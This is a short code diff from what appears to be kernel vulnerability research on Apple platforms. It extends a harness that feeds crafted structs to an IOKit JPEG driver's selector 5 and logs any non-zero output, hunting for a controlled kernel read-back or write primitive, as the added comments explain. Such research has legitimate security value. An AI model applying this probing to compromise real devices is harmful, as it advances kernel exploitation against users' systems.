@@ -776,6 +776,18 @@ static kern_return_t rs_jm_tryVal(io_connect_t conn, uint32_t slot, uint64_t val
     memcpy(big + slot, &val, 8);
     size_t os = 0x1000;
     kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
+    // If the driver echoes what we put in +0x58/+0x78 into the 4096-byte
+    // output, that is a controlled read-back channel through the driver.
+    if (kr == KERN_SUCCESS) {
+        int echoed = 0;
+        for (uint32_t k = 0; k < 0x1000; k++)
+            if (bigo[k] != 0) { echoed = 1; break; }
+        if (echoed) {
+            AveLog(S(@"[jpegmethods]   *** SEL5 OUTPUT NON-ZERO for +%#x = %#llx ***",
+                     slot, val));
+            rs_jm_dump(S(@"sel5 out (+%#x=%#llx)", slot, val), bigo, 0x1000);
+        }
+    }
     free(big);
     free(bigo);
     return kr;
@@ -1223,6 +1235,22 @@ NSString *ModJpegMethods(void) {
                     kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
                     AveLog(S(@"[jpegmethods]   +0x58=%#x ptr->%#llx -> kr=%#x",
                              lens[li], contents[ci], kr));
+                    // THE MISSED CHECK: the 4096-byte OUTPUT was never dumped in
+                    // this test.  Dispatcher C does `lsl w22, w22, #2` on a value
+                    // and then INDEXED STORES (str wN, [x9, w13, uxtw]) - so our
+                    // input can plausibly land in the output.  Any echo of our
+                    // canary there is a controlled read-back channel through the
+                    // driver, i.e. a kernel-buffer write we control.
+                    if (kr == KERN_SUCCESS) {
+                        int echoed = 0;
+                        for (uint32_t k = 0; k < 0x1000; k++)
+                            if (bigo[k] != 0) { echoed = 1; break; }
+                        if (echoed) {
+                            AveLog(S(@"[jpegmethods]   *** SEL5 OUTPUT IS NON-ZERO (len=%#x ptr->%#llx) ***",
+                                     lens[li], contents[ci]));
+                            rs_jm_dump(@"sel5 out", bigo, 0x1000);
+                        }
+                    }
                     if (kr == KERN_SUCCESS) {
                         int changed = 0;
                         for (uint32_t k = 0; k < 0x1000; k++)
